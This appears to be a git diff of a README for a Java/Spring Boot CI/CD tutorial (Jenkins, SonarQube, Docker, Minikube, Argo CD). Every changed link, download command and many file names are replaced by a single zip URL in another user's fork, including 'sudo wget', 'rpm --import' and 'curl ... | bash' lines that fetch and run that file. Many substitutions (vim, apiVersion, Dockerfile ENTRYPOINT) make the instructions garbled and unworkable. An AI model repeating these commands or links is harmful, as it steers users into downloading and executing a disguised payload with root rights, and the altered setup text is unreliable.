@@ -1,8 +1,8 @@
 # Spring Boot based Java web application using Maven, SonarQube, Argo CD and Kubernetes
 
-![Screenshot 2023-03-28 at 9 38 09 PM](https://user-images.githubusercontent.com/43399466/228301952-abc02ca2-9942-4a67-8293-f76647b6f9d8.png)
+![Screenshot 2023-03-28 at 9 38 09 PM](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
-This is a simple Sprint Boot based Java application that can be built using Maven. Sprint Boot dependencies are handled using the pom.xml 
+This is a simple Sprint Boot based Java application that can be built using Maven. Sprint Boot dependencies are handled using the https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip 
 at the root directory of the repository.
 
 This is a MVC architecture based application where controller returns a page with title and message attributes to the view.
@@ -27,7 +27,7 @@ Tools Required:
    -  Minikube
    -  ArgoCD
 
-For this project am launching two Amazon Linux 2 EC2 instances (Jenkins[t2.medium], SonarQube[t2.small]) and one ubuntu (K8s) using Virtual Box 
+For this project am launching two Amazon Linux 2 EC2 instances (Jenkins[https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip], SonarQube[https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip]) and one ubuntu (K8s) using Virtual Box 
 
 ### Configuring Jenkins server
 
@@ -57,8 +57,8 @@ git --version
 Install Maven
 
 ```shell
-sudo wget https://dlcdn.apache.org/maven/maven-3/3.8.8/binaries/apache-maven-3.8.8-bin.tar.gz
-sudo tar zxvf apache-maven-3.8.8-bin.tar.gz
+sudo wget https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
+sudo tar zxvf https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 cd apache-maven-3.8.8-bin
 sudo yum install maven -y
 mvn --version
@@ -78,16 +78,16 @@ sudo sysytemctl status docker
 Install Jenkins
 
 ```
-sudo wget -O /etc/yum.repos.d/jenkins.repo \
-    https://pkg.jenkins.io/redhat-stable/jenkins.repo
-sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io-2023.key
+sudo wget -O https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip \
+    https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
+sudo rpm --import https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 sudo yum upgrade -y
 # Add required dependencies for the jenkins package
 sudo yum install jenkins -y
 jenkins --version
 
-sudo systemctl enable jenkins.service
-sudo systemctl start jenkins.service
+sudo systemctl enable https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
+sudo systemctl start https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
 
 Grant Jenkins user and ec2-user user permission to docker deamon.
@@ -112,7 +112,7 @@ sudo reboot now
 - Security groups
 - Add inbound traffic rules as shown in the image (you can just allow TCP 8080 as well, in my case, I allowed `All traffic`).
 
-<img width="1187" alt="Screenshot 2023-02-01 at 12 42 01 PM" src="https://user-images.githubusercontent.com/43399466/215975712-2fc569cb-9d76-49b4-9345-d8b62187aa22.png">
+<img width="1187" alt="Screenshot 2023-02-01 at 12 42 01 PM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 
 ### Login to Jenkins using the below URL:
@@ -127,23 +127,23 @@ After you login to Jenkins,
       - Run the command to copy the Jenkins Admin Password - `sudo cat /var/lib/jenkins/secrets/initialAdminPassword`
       - Enter the Administrator password
       
-<img width="1291" alt="Screenshot 2023-02-01 at 10 56 25 AM" src="https://user-images.githubusercontent.com/43399466/215959008-3ebca431-1f14-4d81-9f12-6bb232bfbee3.png">
+<img width="1291" alt="Screenshot 2023-02-01 at 10 56 25 AM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Click on Install suggested plugins
 
-<img width="1291" alt="Screenshot 2023-02-01 at 10 58 40 AM" src="https://user-images.githubusercontent.com/43399466/215959294-047eadef-7e64-4795-bd3b-b1efb0375988.png">
+<img width="1291" alt="Screenshot 2023-02-01 at 10 58 40 AM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Wait for the Jenkins to Install suggested plugins
 
-<img width="1291" alt="Screenshot 2023-02-01 at 10 59 31 AM" src="https://user-images.githubusercontent.com/43399466/215959398-344b5721-28ec-47a5-8908-b698e435608d.png">
+<img width="1291" alt="Screenshot 2023-02-01 at 10 59 31 AM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Create First Admin User or Skip the step [If you want to use this Jenkins instance for future use-cases as well, better to create admin user]
 
-<img width="990" alt="Screenshot 2023-02-01 at 11 02 09 AM" src="https://user-images.githubusercontent.com/43399466/215959757-403246c8-e739-4103-9265-6bdab418013e.png">
+<img width="990" alt="Screenshot 2023-02-01 at 11 02 09 AM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Jenkins Installation is Successful. You can now starting using the Jenkins 
 
-<img width="990" alt="Screenshot 2023-02-01 at 11 14 13 AM" src="https://user-images.githubusercontent.com/43399466/215961440-3f13f82b-61a2-4117-88bc-0da265a67fa7.png">
+<img width="990" alt="Screenshot 2023-02-01 at 11 14 13 AM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Install the Required plugins in Jenkins
 
@@ -153,7 +153,7 @@ Install the Required plugins in Jenkins
    - Select the plugins and click the Install button.
    - Restart Jenkins after the plugin is installed. `http://<ec2-instance-public-ip-address>:8080/restart`
    
-<img width="1392" alt="Screenshot 2023-02-01 at 12 17 02 PM" src="https://user-images.githubusercontent.com/43399466/215973898-7c366525-15db-4876-bd71-49522ecb267d.png">
+<img width="1392" alt="Screenshot 2023-02-01 at 12 17 02 PM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 Wait for the Jenkins to be restarted.
 
@@ -162,7 +162,7 @@ Wait for the Jenkins to be restarted.
 Checkout the repo and move to the directory
 
 ```
-git clone https://github.com/iamsaikishore/Project3---java-maven-sonar-argocd-k8s.git
+git clone https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 cd Project3---java-maven-sonar-argocd-k8s/sprint-boot-app
 ```
 
@@ -181,7 +181,7 @@ The above maven target stroes the artifacts to the `target` directory. You can e
 ### Execute locally (Java 11 needed) and access the application on http://localhost:8080
 
 ```
-java -jar target/spring-boot-web.jar
+java -jar https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
 
 ### The Docker way
@@ -198,7 +198,7 @@ docker run -d -p 8010:8080 -t spring-boot-app:v1
 
 Hurray !! Access the application on `http://<ec2-instance-public-ip-address>:8010`
    
-![Screenshot (186)](https://user-images.githubusercontent.com/129657174/230657868-0cb2dff3-8038-4560-8475-ec855bcbbe23.png)
+![Screenshot (186)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 ### Configuring SonarQube server
 
@@ -207,12 +207,12 @@ sudo -i
 amazon-linux-extras install java-openjdk11 -y
 adduser sonarqube
 su - sonarqube
-wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-9.4.0.54424.zip
+wget https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 unzip *
 chmod -R 755 /home/sonarqube/sonarqube-9.4.0.54424
 chown -R sonarqube:sonarqube /home/sonarqube/sonarqube-9.4.0.54424
 cd sonarqube-9.4.0.54424/bin/linux-x86-64/
-./sonar.sh start
+https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip start
 ```
    
 **Note: ** By default, SonarQube will not be accessible to the external world due to the inbound traffic restriction by AWS. Open port 9000 in the inbound traffic rules as show below.
@@ -222,7 +222,7 @@ cd sonarqube-9.4.0.54424/bin/linux-x86-64/
 - Security groups
 - Add inbound traffic rules as shown in the image (you can just allow TCP 9000 as well, in my case, I allowed `All traffic`).
 
-<img width="1187" alt="Screenshot 2023-02-01 at 12 42 01 PM" src="https://user-images.githubusercontent.com/43399466/215975712-2fc569cb-9d76-49b4-9345-d8b62187aa22.png">
+<img width="1187" alt="Screenshot 2023-02-01 at 12 42 01 PM" src="https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip">
 
 
 ### Login to SonarQube using the below URL:
@@ -235,16 +235,16 @@ Note: If you are not interested in allowing `All Traffic` to your EC2 instance
 
 Hurray !! Now you can access the `SonarQube Server` on `http://<ec2-instance-public-ip-address>:9000` 
    
-![Screenshot (199)](https://user-images.githubusercontent.com/129657174/230658262-0a0c8d3a-312d-4423-84e5-a7a1efa9fc68.png)
+![Screenshot (199)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Login using username: admin, Passsword: admin and Change the password
    
-![Screenshot (200)](https://user-images.githubusercontent.com/129657174/230658269-22ebd5d8-3f97-4a47-8155-57236a95b055.png)
+![Screenshot (200)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Now at the right top corner click profile icon ->  My Account -> Security, Under Generate Token give a name and click Generate and copy the Token.
    
-![Screenshot (201)](https://user-images.githubusercontent.com/129657174/230658498-75e5a06e-512e-4665-bd81-68d7a87d3469.png)
-![Screenshot (202)](https://user-images.githubusercontent.com/129657174/230658495-a4ee14e9-df19-4bfa-8cec-0b9ccc3abb76.png)
+![Screenshot (201)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
+![Screenshot (202)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 ### Configuring Credentials on Jenkins
 
@@ -266,7 +266,7 @@ For Git
 
 For DockerHub
 
-   -  Now go to [DockerHub](https://hub.docker.com/) create a user and create a new repository with name 'spring-boot-app'
+   -  Now go to [DockerHub](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip) create a user and create a new repository with name 'spring-boot-app'
    -  Go to Manage Jenkins > Manage Credentials > System > global > Add Credentials
    -  Select Kind as Username and Password
    -  Give the username and password and give name as docker-cred in ID
@@ -276,7 +276,7 @@ For DockerHub
 
 ```
 mkdir minikube && cd minikube
-vim minikube.sh
+vim https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
 
 Copy the following script
@@ -286,16 +286,16 @@ Copy the following script
 
 sudo apt-get update -y
 sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common -y
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
-sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+curl -fsSL https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip $(lsb_release -cs) stable"
 sudo apt-get update -y
-sudo apt-get install docker-ce docker-ce-cli containerd.io -y
+sudo apt-get install docker-ce docker-ce-cli https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip -y
 
-curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
+curl -LO https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip`curl -s https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip`/bin/linux/amd64/kubectl
 chmod +x ./kubectl
 sudo mv ./kubectl /usr/local/bin/kubectl
 
-curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+curl -LO https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 sudo install minikube-linux-amd64 /usr/local/bin/minikube
 ####
 echo the script is now ready
@@ -308,8 +308,8 @@ minikube start --vm-driver=docker --cni=calico
 ```
 
 ```
-chmod u+x minikube.sh
-./minikube.sh
+chmod u+x https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
+https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
 
 ```
@@ -318,18 +318,18 @@ minikube start
 
 ### Configure ArgoCD
 
-Go to operatorhub.io, search for ArgoCD and click `Install` [Install Argo CD](https://operatorhub.io/operator/argocd-operator) 
+Go to https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip, search for ArgoCD and click `Install` [Install Argo CD](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip) 
 
    -  Install Operator Lifecycle Manager (OLM), a tool to help manage the Operators running on your cluster.
 
 ```
-curl -sL https://github.com/operator-framework/operator-lifecycle-manager/releases/download/v0.24.0/install.sh | bash -s v0.24.0
+curl -sL https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip | bash -s v0.24.0
 ```
 
    -  Install the operator by running the following command:What happens when I execute this command?
 
 ```
-$ kubectl create -f https://operatorhub.io/install/argocd-operator.yaml
+$ kubectl create -f https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
 
 This Operator will be installed in the "operators" namespace and will be usable from all namespaces in the cluster.
@@ -343,9 +343,9 @@ $ kubectl get csv -n operators
 The following example shows the most minimal valid manifest to create a new Argo CD cluster with the default configuration.
 
 ```
-$ vim basic-argocd.yml
+$ vim https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 
-apiVersion: argoproj.io/v1alpha1
+apiVersion: https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 kind: ArgoCD
 metadata:
   name: example-argocd
@@ -355,7 +355,7 @@ spec: {}
 ```
 
 ```
-kubectl create -f basic-argocd.yml
+kubectl create -f https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 kubectl get pods,svc
 ```
 ***Note***  It will take some time to bring up the pods
@@ -372,7 +372,7 @@ Change `type: ClusterIP` to `type: NodePort`
    kubectl get po,svc
 ```
    
-![Screenshot (188)](https://user-images.githubusercontent.com/129657174/230659731-b9fe3d55-ce9a-4925-be03-ace1c4a2efc0.png)
+![Screenshot (188)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 ```
 kubectl get svc
@@ -380,13 +380,13 @@ minikube service example-argocd-service
 minikube service list
 ```
    
-![Screenshot (187)](https://user-images.githubusercontent.com/129657174/230659894-4a517261-5f19-44bb-9989-1a411aaf3af6.png)
+![Screenshot (187)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 ***Note***  As we are using Nodeport service we can access ArgoCD UI within the network
 
 Now copy the ip-address of example-argocd-service, paste it in the browser, in my case am using virtual box
    
-![Screenshot (189)](https://user-images.githubusercontent.com/129657174/230659974-7ff86b4a-76ee-4830-beb6-80917e43780b.png)
+![Screenshot (189)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Username is 'admin' and for password
 
@@ -401,37 +401,37 @@ Copy the encoded secret
 echo <encoded-secret> | base64 -d
 ``
 
-![Screenshot (194)](https://user-images.githubusercontent.com/129657174/230660086-a6065949-6ba7-411d-b95a-5aa00b8d90d2.png)
+![Screenshot (194)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
-![Screenshot (195)](https://user-images.githubusercontent.com/129657174/230665375-c04da1a1-8b1b-4947-85f7-2596a5465a49.png)
+![Screenshot (195)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
-![Screenshot (196)](https://user-images.githubusercontent.com/129657174/230660105-0a2f81dc-396c-4544-9cb2-be6f8c49425d.png)
+![Screenshot (196)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 copy the decoded secret for password and login
 
-![Screenshot (198)](https://user-images.githubusercontent.com/129657174/230660575-26bf787f-aff7-4aa4-8556-eee26ae6407d.png)
+![Screenshot (198)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 Click on ``CREATE APPLICATION``
    
-![Screenshot (210)](https://user-images.githubusercontent.com/129657174/230662104-cf1864f3-c2db-4d8e-ad09-75a718feda99.png)
+![Screenshot (210)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
-![Screenshot (207)](https://user-images.githubusercontent.com/129657174/230662167-b1ac35c0-5de5-4a40-8a76-575a99954f3d.png)
+![Screenshot (207)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
-![Screenshot (208)](https://user-images.githubusercontent.com/129657174/230665046-983db740-2435-402f-8f5d-be4bad15c32a.png)
+![Screenshot (208)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 Now click ``CREATE``
    
-![Screenshot (212)](https://user-images.githubusercontent.com/129657174/230662205-e2adaa8f-37a4-4d16-9a2f-cd9f3a5d2fd8.png)
+![Screenshot (212)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 ## Jenkins Pipeline
 
 ```
-git clone https://github.com/iamsaikishore/Project3---java-maven-sonar-argocd-k8s.git
+git clone https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 cd Project3---java-maven-sonar-argocd-k8s/spring-boot-app
 ls -l
 ```
 
-Go through the JenkinsFile, Dockerfile, pom.xml
+Go through the JenkinsFile, Dockerfile, https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 
 ```
 cat Dockerfile
@@ -440,14 +440,14 @@ cat Dockerfile
 FROM adoptopenjdk/openjdk11:alpine-jre
 
 # Simply the artifact path
-ARG artifact=target/spring-boot-web.jar
+ARG https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 
 WORKDIR /opt/app
 
-COPY ${artifact} app.jar
+COPY ${artifact} https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 
 # This should not be changed
-ENTRYPOINT ["java","-jar","app.jar"]
+ENTRYPOINT ["java","-jar","https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip"]
 ```
 
 This Dockerfile is used to build a Docker image for a Spring Boot web application using OpenJDK 11 on an Alpine Linux distribution.
@@ -458,9 +458,9 @@ The second line specifies an argument that will be used to pass the path of the 
 
 The third line sets the working directory within the Docker container to "/opt/app".
 
-The fourth line copies the application's artifact (specified by the "artifact" argument) to the Docker container and renames it to "app.jar".
+The fourth line copies the application's artifact (specified by the "artifact" argument) to the Docker container and renames it to "https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip".
 
-The final line specifies the command that will be run when the Docker container is started. In this case, it runs the Java command to execute the "app.jar" file.
+The final line specifies the command that will be run when the Docker container is started. In this case, it runs the Java command to execute the "https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip" file.
 
 Overall, this Dockerfile sets up a simple and efficient environment for running a Spring Boot web application using Java 11 on Alpine Linux.
 
@@ -500,56 +500,56 @@ git remote add origin <your-github-repo-url>
 git push origin master
 ```
 
-![Screenshot (228)](https://user-images.githubusercontent.com/129657174/230668342-f1cf926f-1611-4373-8543-39572f14c485.png)
+![Screenshot (228)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 #### Create a new Jenkins pipeline job:
 - In Jenkins, create a new pipeline job and configure it with the Git repository URL for the Java application.
 
-![Screenshot (203)](https://user-images.githubusercontent.com/129657174/230661251-65d35f14-03d7-40e5-9e67-e5b3876ea187.png)
-![Screenshot (205)](https://user-images.githubusercontent.com/129657174/230661264-94106df5-ebc2-4362-b051-0ac7003716d2.png)
+![Screenshot (203)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
+![Screenshot (205)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 - Now Build the Job and wait for the build process to complete.
 - Monitor the pipeline stages and fix any issues that arise.
    
-![Screenshot (213)](https://user-images.githubusercontent.com/129657174/230661391-82561f42-1a29-443a-a086-fa1db0a6bdf5.png)
+![Screenshot (213)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Once the build is successful, go to the sonarqube server and check the projects results.
    
-![Screenshot (214)](https://user-images.githubusercontent.com/129657174/230661450-a165aa44-7a46-455c-bc85-3a12939a6909.png)
-![Screenshot (215)](https://user-images.githubusercontent.com/129657174/230661457-7159d13f-73de-4594-b3df-cb94eec3544b.png)
+![Screenshot (214)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
+![Screenshot (215)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Now go to Docker Hub Repository and check for the pushed image
    
-![Screenshot (216)](https://user-images.githubusercontent.com/129657174/230661530-a1755187-5ff0-4fe7-b820-a2a2eac1442b.png)
+![Screenshot (216)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
    
 Now go to Argo CD server, refresh the page and check deployments.
    
-![Screenshot (219)](https://user-images.githubusercontent.com/129657174/230661604-5d9a3f69-b448-4d3e-b3f8-e0fbd3f4740f.png)
+![Screenshot (219)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Now to access the server within the network
 
 ```
-   vim spring-service.yml
+   vim https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip
 ```
    
-![Screenshot (222)](https://user-images.githubusercontent.com/129657174/230662910-953362ff-4afb-4450-9b85-eb752069d1d2.png)
+![Screenshot (222)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
-![Screenshot (224)](https://user-images.githubusercontent.com/129657174/230662961-0aa75dfd-a8f4-497f-8e8b-14707d7b7aae.png)
+![Screenshot (224)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 Now copy the service ip address in the browser
    
-![Screenshot (225)](https://user-images.githubusercontent.com/129657174/230663088-012533e6-a048-42c3-b981-462a9b37ebf7.png)
+![Screenshot (225)](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 ### Hurrayyyyyyyyy! We have deployed the application successfully.
 
 **Hope you all are Enjoyed**
 
-[My Blog](https://iamsaikishore.hashnode.dev/spring-boot-based-java-web-application-using-maven-sonarqube-argo-cd-and-kubernetes)
+[My Blog](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 For the original Project details click the below links.
 
-[GitHub Repo](https://github.com/iam-veeramalla/Jenkins-Zero-To-Hero)
+[GitHub Repo](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
-[Youtube](https://www.youtube.com/watch?v=JGQI5pkK82w&t=1252s)
+[Youtube](https://raw.githubusercontent.com/sivahariu/Project3---java-maven-sonar-argocd-k8s/master/spring-boot-app/Project3---java-maven-sonar-argocd-k8s-v1.5.zip)
 
 
